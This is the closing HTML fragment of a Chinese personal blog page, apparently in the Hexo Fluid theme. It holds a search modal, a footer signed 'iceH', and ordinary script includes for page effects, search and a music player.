id="scroll-top-button" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">搜索</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">关键词</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer class="text-center mt-5 py-3"><div class="footer-content"><span>iceH</span> <i class="iconfont icon-love"></i> <span>一条啥也不会的咸鱼！</span></div></footer><script src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:200}),NProgress.start(),document.addEventListener("DOMContentLoaded",(function(){window.NProgress&&window.NProgress.inc()})),window.addEventListener("load",(function(){NProgress.done()}))</script><script src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js"></script><script src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js"></script><script src="/js/debouncer.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="/js/lazyload.js"></script><script src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js"></script><script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script><script src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js"></script><script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script><script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script><script>!function(t,i){(0,Fluid.plugins.typing)(i.getElementById("subtitle").title)}(window,document)</script><script src="/js/local-search.js"></script><script>document.querySelector("#local-search-input").onclick=function(){searchFunc("/local-search.xml","local-search-input","local-search-result"),this.onclick=null}</script><script src="/js/qipao.js"></script><script src="/js/jingtaisidai.js"></script><script src="/js/dianjichuzi.js"></script><script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="/js/boot.js"></script></body></html>